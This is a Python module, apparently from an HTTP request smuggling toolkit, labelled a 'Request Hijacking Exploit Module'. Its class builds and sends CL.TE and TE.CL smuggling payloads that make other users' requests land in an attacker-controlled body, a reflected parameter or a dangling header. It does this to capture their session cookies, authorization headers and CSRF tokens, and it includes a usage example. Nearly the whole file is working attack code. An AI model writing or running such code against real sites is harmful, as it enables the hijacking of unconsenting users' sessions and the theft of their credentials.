"""
Request Hijacking Exploit Module

Exploits HTTP smuggling to hijack other users' requests.
"""

from typing import Optional, Dict, List, Callable
from dataclasses import dataclass
import time
import threading

from core.connection import RawHTTPClient
from core.parser import HTTPResponseParser
from payloads.generator import PayloadGenerator


@dataclass 
class HijackResult:
    """Result of request hijacking attempt"""
    success: bool
    technique: str
    captured_request: str = ""
    captured_headers: Dict[str, str] = None
    captured_cookies: List[str] = None
    details: str = ""


class RequestHijacker:
    """
    Exploits HTTP smuggling to hijack other users' requests.
    
    Request hijacking works by:
    1. Smuggling a request with incomplete body (Content-Length set high)
    2. The back-end waits for more body data
    3. The next user's request becomes part of the smuggled body
    4. Attacker retrieves or reflects the captured data
    
    This can capture:
    - Session cookies
    - Authentication tokens
    - CSRF tokens
    - Form data
    
    Example:
        hijacker = RequestHijacker("https://example.com")
        
        # Set up capture endpoint first
        result = hijacker.hijack("/capture-endpoint", technique="cl-te")
        
        if result.success:
            print(f"Captured: {result.captured_request}")
    """
    
    def __init__(
        self,
        target_url: str,
        timeout: float = 30.0,  # Longer timeout for hijacking
        verify_ssl: bool = False
    ):
        """
        Initialize request hijacker.
        
        Args:
            target_url: Target URL
            timeout: Request timeout
            verify_ssl: Verify SSL certificates
        """
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_ssl = parsed.scheme == "https"
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        
        self.parser = HTTPResponseParser()
        self.payload_gen = PayloadGenerator(self.host)
        
    def _create_client(self) -> RawHTTPClient:
        """Create a new HTTP client"""
        return RawHTTPClient(
            host=self.host,
            port=self.port,
            use_ssl=self.use_ssl,
            timeout=self.timeout,
            verify_ssl=self.verify_ssl
        )
    
    def hijack(
        self,
        capture_path: str,
        technique: str = "cl-te",
        body_length: int = 200
    ) -> HijackResult:
        """
        Attempt to hijack the next request.
        
        Note: This requires another request to come through on the same
        connection/socket. In real scenarios, you'd need to trigger
        a victim to make a request.
        
        Args:
            capture_path: Path where captured data will be sent
            technique: Smuggling technique
            body_length: Expected body length (captures victim data)
            
        Returns:
            HijackResult with captured data
        """
        # Generate hijack payload
        payload = self.payload_gen.request_hijack_payload(
            technique=technique,
            capture_path=capture_path
        )
        
        client = self._create_client()
        
        try:
            client.connect()
            
            # Send hijack payload
            response_bytes, stats = client.send_raw(payload.encode())
            response = self.parser.parse(response_bytes)
            
            # The first response is to our visible request
            # We need to check if smuggled request captured anything
            
            # Look for multiple responses (victim's data in second response)
            all_responses = self.parser.parse_multiple(response_bytes)
            
            if len(all_responses) > 1:
                # Got multiple responses - may have captured victim request
                captured = all_responses[1]
                return HijackResult(
                    success=True,
                    technique=technique,
                    captured_request=captured.raw.decode("utf-8", errors="ignore")[:1000],
                    captured_headers=captured.headers,
                    details="Multiple responses received - possible request capture"
                )
            
            # Check if response contains smuggled content indicators
            body = response.body.decode("utf-8", errors="ignore")
            if "captured=" in body or "Cookie:" in body or "Authorization:" in body:
                return HijackResult(
                    success=True,
                    technique=technique,
                    captured_request=body,
                    details="Captured content found in response body"
                )
                
            return HijackResult(
                success=False,
                technique=technique,
                details="No victim request captured (may need victim to make request)"
            )
            
        finally:
            client.close()
    
    def hijack_with_reflection(
        self,
        reflect_path: str,
        reflect_param: str = "data",
        technique: str = "cl-te"
    ) -> HijackResult:
        """
        Hijack using a reflection point.
        
        Uses endpoints that reflect input (search, error pages) to
        display captured request data.
        
        Args:
            reflect_path: Path that reflects user input
            reflect_param: Parameter that gets reflected
            technique: Smuggling technique
            
        Returns:
            HijackResult with captured data
        """
        # Smuggle a request to the reflect endpoint
        # The victim's request becomes the reflected parameter value
        
        if technique == "cl-te":
            smuggled = (
                f"GET {reflect_path}?{reflect_param}= HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 250\r\n"
                f"\r\n"
            )
            
            body = f"0\r\n\r\n{smuggled}"
            
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )
        else:
            # TE.CL version
            smuggled = (
                f"GET {reflect_path}?{reflect_param}= HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 250\r\n"
                f"\r\n"
            )
            
            chunk_size = hex(len(smuggled))[2:]
            
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n"
                f"{smuggled}\r\n"
                f"0\r\n"
                f"\r\n"
            )
        
        client = self._create_client()
        
        try:
            client.connect()
            response_bytes, _ = client.send_raw(payload.encode())
            response = self.parser.parse(response_bytes)
            
            # Check for reflected content with victim data
            body = response.body.decode("utf-8", errors="ignore")
            
            # Look for HTTP request patterns in reflected content
            http_patterns = ["GET ", "POST ", "Cookie:", "Authorization:", "User-Agent:"]
            
            for pattern in http_patterns:
                if pattern in body:
                    return HijackResult(
                        success=True,
                        technique=technique,
                        captured_request=body,
                        details=f"Found reflected HTTP content: {pattern}"
                    )
                    
            return HijackResult(
                success=False,
                technique=technique,
                details="No HTTP content found in reflection"
            )
            
        finally:
            client.close()
    
    def session_hijack(
        self,
        technique: str = "cl-te",
        target_path: str = "/account"
    ) -> HijackResult:
        """
        Attempt session hijacking by capturing cookies.
        
        Args:
            technique: Smuggling technique
            target_path: Path that requires authentication
            
        Returns:
            HijackResult with session data
        """
        # Smuggle a request that will receive the victim's cookies
        if technique == "cl-te":
            # Smuggle incomplete request - victim's request completes it
            smuggled = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"X-Ignore: "  # Victim's request becomes header value
            )
            
            body = f"0\r\n\r\n{smuggled}"
            
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )
        else:
            smuggled = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"X-Ignore: "
            )
            
            chunk_size = hex(len(smuggled))[2:]
            
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n"
                f"{smuggled}\r\n"
                f"0\r\n"
                f"\r\n"
            )
        
        client = self._create_client()
        
        try:
            client.connect()
            response_bytes, _ = client.send_raw(payload.encode())
            
            # Parse potentially multiple responses
            all_responses = self.parser.parse_multiple(response_bytes)
            
            # Look for session indicators in any response
            captured_cookies = []
            
            for resp in all_responses:
                body = resp.body.decode("utf-8", errors="ignore")
                
                # Check for cookie patterns
                if "session" in body.lower() or "cookie" in body.lower():
                    captured_cookies.append(body)
                
                # Check Set-Cookie headers (might be victim's session creation)
                set_cookies = resp.get_all_headers("Set-Cookie")
                captured_cookies.extend(set_cookies)
            
            if captured_cookies:
                return HijackResult(
                    success=True,
                    technique=technique,
                    captured_cookies=captured_cookies,
                    details="Session cookies captured"
                )
                
            return HijackResult(
                success=False,
                technique=technique,
                details="No session cookies captured"
            )
            
        finally:
            client.close()
